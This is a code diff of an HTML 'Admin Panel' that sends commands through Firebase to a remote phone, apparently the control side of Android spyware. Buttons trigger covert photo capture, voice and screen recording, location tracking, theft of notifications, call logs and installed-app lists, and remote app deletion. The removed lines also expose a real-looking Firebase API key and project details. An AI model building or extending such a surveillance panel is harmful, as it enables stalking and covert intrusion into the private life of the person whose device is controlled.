@@ -1,117 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Remote Control Admin Panel</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    .btn-animate {
-      transition: transform 0.2s ease, box-shadow 0.3s ease;
-    }
-    .btn-animate:hover {
-      transform: translateY(-3px) scale(1.03);
-      box-shadow: 0 10px 15px rgba(0, 0, 0, 0.15);
-    }
-  </style>
-  <!-- Firebase JS SDK (v10+) -->
-  <script type="module">
-    // Firebase imports
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Admin Panel - Single User Control</title>
+<!-- FontAwesome CDN for icons -->
+<link
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+  rel="stylesheet"
+/>
+<style>
+  /* Reset */
+  * {
+    box-sizing: border-box;
+  }
 
-    // Your Firebase config (from your screenshot)
-    const firebaseConfig = {
-      apiKey: "AIzaSy8mj3uIH06Ek3G1q58D1cm4RF5JfNTt0Y",
-      authDomain: "xsiam-8cd91.firebaseapp.com",
-      databaseURL: "https://xsiam-8cd91-default-rtdb.firebaseio.com",
-      projectId: "xsiam-8cd91",
-      storageBucket: "xsiam-8cd91.appspot.com",
-      messagingSenderId: "144979568178",
-      appId: "1:144979568178:web:0ac436e5207f5568aef7b",
-      measurementId: "G-XP6J4uHQMK"
-    };
+  body {
+    margin: 0;
+    background: #121212;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: #eee;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    align-items: center;
+    padding: 20px;
+  }
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const database = getDatabase(app);
+  h1 {
+    color: #4caf50;
+    margin-bottom: 10px;
+    text-shadow: 0 0 6px #4caf50aa;
+  }
 
-    // Make sendCommand globally accessible
-    window.sendCommand = function(command) {
-      const responseBox = document.getElementById("responseBox");
-      // Push command to Firebase under 'admin_commands'
-      push(ref(database, 'admin_commands'), {
-        command: command,
-        timestamp: Date.now()
-      }).then(() => {
-        responseBox.textContent = `✔️ Command "${command}" sent to Firebase!`;
-      }).catch((e) => {
-        responseBox.textContent = `❌ Failed to send command: ${e.message}`;
-      });
-    }
-  </script>
+  .container {
+    background: #1f1f1f;
+    border-radius: 12px;
+    padding: 30px 40px;
+    max-width: 480px;
+    width: 100%;
+    box-shadow: 0 0 20px #4caf50aa;
+  }
+
+  .btn-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 18px 25px;
+  }
+
+  button.cmd-btn {
+    background: #282828;
+    border: none;
+    border-radius: 14px;
+    padding: 18px 20px;
+    color: #eee;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    box-shadow: 0 0 10px transparent;
+    transition: 
+      background-color 0.25s ease,
+      box-shadow 0.3s ease,
+      transform 0.15s ease;
+  }
+
+  button.cmd-btn:hover {
+    background: #4caf50;
+    color: #121212;
+    box-shadow: 0 0 12px #4caf50aa;
+    transform: translateY(-3px);
+  }
+
+  button.cmd-btn:active {
+    transform: translateY(0);
+    box-shadow: 0 0 5px #388e3c;
+  }
+
+  button.cmd-btn i {
+    font-size: 24px;
+    transition: transform 0.3s ease;
+  }
+
+  button.cmd-btn:hover i {
+    transform: rotate(15deg);
+  }
+
+  /* Log box */
+  #log {
+    margin-top: 28px;
+    background: #222;
+    border-radius: 10px;
+    padding: 14px 20px;
+    height: 180px;
+    overflow-y: auto;
+    font-family: monospace;
+    font-size: 14px;
+    box-shadow: inset 0 0 10px #111;
+  }
+
+  /* Footer */
+  footer {
+    margin-top: auto;
+    color: #666;
+    font-size: 13px;
+    user-select: none;
+  }
+</style>
 </head>
-<body class="bg-gray-100 font-sans py-10 px-4">
+<body>
 
-  <div class="max-w-6xl mx-auto bg-white shadow-2xl rounded-2xl p-8">
-    <h1 class="text-4xl font-bold text-center mb-10 text-blue-700">📲 Remote Control Admin Panel</h1>
+<h1><i class="fas fa-tools"></i> Admin Panel</h1>
 
-    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+<div class="container">
+  <div class="btn-grid">
+    <button class="cmd-btn" onclick="sendCommand('take_photo')">
+      <i class="fas fa-camera"></i> Take Photo
+    </button>
 
-      <button onclick="sendCommand('get_location')" class="btn-animate bg-blue-500 hover:bg-blue-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        📍 Get Location
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('start_voice_record')">
+      <i class="fas fa-microphone"></i> Start Voice Record
+    </button>
 
-      <button onclick="sendCommand('get_gallery')" class="btn-animate bg-purple-500 hover:bg-purple-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        🖼️ Access Gallery
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('stop_voice_record')">
+      <i class="fas fa-stop-circle"></i> Stop Voice Record
+    </button>
 
-      <button onclick="sendCommand('get_apps')" class="btn-animate bg-pink-500 hover:bg-pink-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        📱 Installed Apps
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('get_location')">
+      <i class="fas fa-location-dot"></i> Get Location
+    </button>
 
-      <button onclick="sendCommand('get_files')" class="btn-animate bg-green-500 hover:bg-green-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        📁 File Manager
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('start_screen_record')">
+      <i class="fas fa-video"></i> Start Screen Record
+    </button>
 
-      <button onclick="sendCommand('uninstall_app')" class="btn-animate bg-red-500 hover:bg-red-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        ❌ Uninstall App
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('stop_screen_record')">
+      <i class="fas fa-square"></i> Stop Screen Record
+    </button>
 
-      <button onclick="sendCommand('get_sysinfo')" class="btn-animate bg-indigo-500 hover:bg-indigo-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        🧠 System Info
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('get_notifications')">
+      <i class="fas fa-bell"></i> Get Notifications
+    </button>
 
-      <button onclick="sendCommand('refresh_data')" class="btn-animate bg-yellow-400 hover:bg-yellow-500 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        🔄 Refresh
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('get_call_logs')">
+      <i class="fas fa-phone"></i> Get Call Logs
+    </button>
 
-      <button onclick="sendCommand('file_transfer')" class="btn-animate bg-orange-500 hover:bg-orange-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        📤 Upload / Download
-      </button>
+    <button class="cmd-btn" onclick="sendCommand('get_installed_apps')">
+      <i class="fas fa-mobile-alt"></i> Installed Apps
+    </button>
 
-      <button onclick="sendCommand('send_notification')" class="btn-animate bg-teal-500 hover:bg-teal-600 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        💬 Push Notification
-      </button>
-
-      <!-- NEW: Take Photo -->
-      <button onclick="sendCommand('take_photo')" class="btn-animate bg-gray-800 hover:bg-gray-900 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        📸 Take Photo
-      </button>
-
-      <!-- NEW: Record Video -->
-      <button onclick="sendCommand('record_video')" class="btn-animate bg-amber-600 hover:bg-amber-700 text-white py-4 px-6 rounded-2xl text-lg font-semibold flex items-center justify-center">
-        🎥 Record Video
-      </button>
-
-    </div>
-
-    <!-- Response Section -->
-    <div class="mt-10 bg-gray-100 p-4 rounded-xl border">
-      <h2 class="font-bold text-lg mb-2 text-gray-700">📥 Command Response:</h2>
-      <pre id="responseBox" class="text-sm text-gray-600 whitespace-pre-wrap">No response yet...</pre>
-    </div>
-
+    <button class="cmd-btn" onclick="promptDeleteApp()">
+      <i class="fas fa-trash-alt"></i> Delete App
+    </button>
   </div>
+
+  <div id="log"></div>
+</div>
+
+<footer>Powered by Firebase &amp; Your System</footer>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<script>
+  // Replace these with your Firebase project config
+  const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT.firebaseapp.com",
+    databaseURL: "https://YOUR_PROJECT.firebaseio.com",
+    projectId: "YOUR_PROJECT",
+    storageBucket: "YOUR_PROJECT.appspot.com",
+    messagingSenderId: "SENDER_ID",
+    appId: "APP_ID"
+  };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // Since single user, fixed userId here
+  const userId = "singleUser";
+
+  function sendCommand(command) {
+    if (command === 'delete_app') {
+      promptDeleteApp();
+      return;
+    }
+
+    db.ref('commands/' + userId).update({
+      [command]: true,
+      timestamp: Date.now()
+    });
+    log(`Command sent: ${command}`);
+  }
+
+  function promptDeleteApp() {
+    const appPackage = prompt("Enter app package name to delete (e.g. com.example.app):");
+    if (appPackage && appPackage.trim().length > 0) {
+      db.ref('commands/' + userId).update({
+        delete_app: appPackage.trim(),
+        timestamp: Date.now()
+      });
+      log(`Command sent: delete_app => ${appPackage.trim()}`);
+    } else {
+      log('Delete app command cancelled or empty input');
+    }
+  }
+
+  function log(msg) {
+    const logBox = document.getElementById('log');
+    const time = new Date().toLocaleTimeString();
+    logBox.innerHTML += `[${time}] ${msg}<br>`;
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+</script>
+
 </body>
 </html>
